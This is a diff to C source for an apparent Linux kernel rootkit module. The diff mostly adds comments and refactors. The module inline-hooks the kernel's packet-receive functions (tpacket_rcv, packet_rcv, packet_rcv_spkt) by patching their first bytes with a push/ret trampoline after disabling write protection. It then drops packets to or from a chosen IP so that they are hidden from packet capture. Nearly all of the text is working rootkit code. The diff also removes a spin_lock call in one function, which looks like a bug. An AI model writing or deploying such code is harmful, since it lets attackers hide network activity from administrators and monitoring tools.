@@ -18,6 +18,9 @@
 #define wp() enable_wp()
 #define HIJACK_LEN 6
 
+/*
+*	Functions and addresses for hijacking
+*/
 static unsigned long *tpacket_rcv_addr, *packet_rcv_addr,*packet_rcv_spkt_addr;
 static int (*tpacket_rcv)(struct sk_buff*, struct net_device*,
 			  struct packet_type*, struct net_device*);
@@ -35,55 +38,86 @@ static int my_packet_rcv(struct sk_buff*, struct net_device*,
 static int my_packet_rcv_spkt(struct sk_buff*, struct net_device*,
 			  struct packet_type*, struct net_device*);
 
+
 static int check_packet(struct sk_buff*);
 
+/*
+*	Original 6 bytes of the hijacked functions
+*/
 char tpacket_rcv_code[HIJACK_LEN];
 char packet_rcv_code[HIJACK_LEN];
 char packet_rcv_spkt_code[HIJACK_LEN];
 
+/*
+*	Injected code used for hijacking:
+*	pushq $0xADDRESS
+*	retq
+*/
+char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
+unsigned int *p_addr = (unsigned int*) (hjc+1);
+
+/*
+*	IP hiding stuff
+*/
 char * hidden_ip_str = "000.000.000.000";
 unsigned int hidden_ip = 0;
-//char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
-//unsigned int *p_addr = (unsigned int*) (hjc+1);
 
+/*
+*	Module Parameters
+*/
 module_param(hidden_ip_str, charp, 0);
 MODULE_PARM_DESC(hidden_ip_str, "IP address format: xxx.xxx.xxx.xxx");
 
+/*
+*	Union to conveniently extract parts of an 64 bit address
+*/
 union address_conv_t {
 	unsigned long d64;
 	unsigned int d32[2];
 	unsigned char d8 [4];
-};
+} adc;
+
 
 spinlock_t hijack_lock;
 
+/*
+* 	Convert IP string to integer
+*/
 unsigned int ipstr_to_int(char* ip_str)
 {
-  int err;
-  unsigned int ip;
-  const char* end;
+	int err;
+	unsigned char ip[4];
+	unsigned int ret;
+	const char* end;
 
-  // Parse IP address
-  err = in4_pton(ip_str, -1, &ip, -1, &end);
-  if (err == 0) {
-    return -1;
-  }
-  return ip;
+	err = in4_pton(ip_str, -1, ip, -1, &end);
+	if (err == 0) {
+		return -1;
+	}
+	
+	ret = *((unsigned int*)ip);
+	return ret;
 }
 
+/*
+*	Initiate fucntion hijacking by replacing the functions first bytes
+*	with the code mentioned above.
+*	
+*/
 void hijack_tpacket_rcv(void){
-	char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
-	unsigned int *p_addr = (unsigned int*) (hjc+1);
-	union address_conv_t adc;
 	spin_lock(&hijack_lock);
 	adc.d64 = (unsigned long) my_tpacket_rcv;
 	*p_addr = adc.d32[0];
-	memcpy(tpacket_rcv_code, tpacket_rcv_addr, HIJACK_LEN);
+	memcpy(tpacket_rcv_code, tpacket_rcv_addr, HIJACK_LEN); //save old code
 	dp();
-	memcpy(tpacket_rcv_addr, &hjc, HIJACK_LEN);
+	memcpy(tpacket_rcv_addr, &hjc, HIJACK_LEN); //inject our code
 	wp();
 	spin_unlock(&hijack_lock);
 }
+/*
+*	Hookfunction - print function's name and check if packet may pass.
+*	If yes, restore old function, call and hijack again.
+*/
 static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 			  struct packet_type *pt, struct net_device *orig_dev){
 	int ret;
@@ -96,10 +130,11 @@ static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	hijack_tpacket_rcv();
 	return ret;
 }
+
+/*
+*	The following functions are just the same. Go to line 180
+*/
 void hijack_packet_rcv(void){
-	char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
-	unsigned int *p_addr = (unsigned int*) (hjc+1);
-	union address_conv_t adc;
 	spin_lock(&hijack_lock);
 	adc.d64 = (unsigned long) my_packet_rcv;
 	*p_addr = adc.d32[0];
@@ -122,10 +157,6 @@ static int my_packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	return ret;
 }
 void hijack_packet_rcv_spkt(void){
-	char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
-	unsigned int *p_addr = (unsigned int*) (hjc+1);
-	union address_conv_t adc;
-	spin_lock(&hijack_lock);
 	adc.d64 = (unsigned long) my_packet_rcv_spkt;
 	*p_addr = adc.d32[0];
 	memcpy(packet_rcv_spkt_code, packet_rcv_spkt_addr, HIJACK_LEN);
@@ -146,6 +177,11 @@ static int my_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	hijack_packet_rcv_spkt();
 	return ret;
 }
+//--------------------------------------------------------------
+/*
+*	Checks if the destination or source of the IP packet are
+*	the ones we're looking for. Returns 1 if yes, else 0.
+*/
 static int check_packet(struct sk_buff* skb)
 {
 	printk(KERN_INFO "checking packet....\n");
@@ -159,6 +195,11 @@ static int check_packet(struct sk_buff* skb)
 	}
 	return 0;
 }
+
+/*
+*	Get function addresses from kallsysms, since sysmap.h doesn't provide the symbols.
+*	Begin with the hijacking.
+*/
 void hide_packets(void){
 	printk(KERN_INFO "===================================\n");
 	hidden_ip = ipstr_to_int(hidden_ip_str);
@@ -178,7 +219,9 @@ void hide_packets(void){
 //	printk(KERN_INFO "0x%p\n", packet_rcv_addr);
 //	printk(KERN_INFO "0x%p\n", tpacket_rcv_addr);
 }
-
+/*
+*	Reset all function headers and break the hijacking chain.
+*/
 void unhide_packets(void){
 	dp();
 	memcpy(tpacket_rcv_addr, tpacket_rcv_code, HIJACK_LEN);
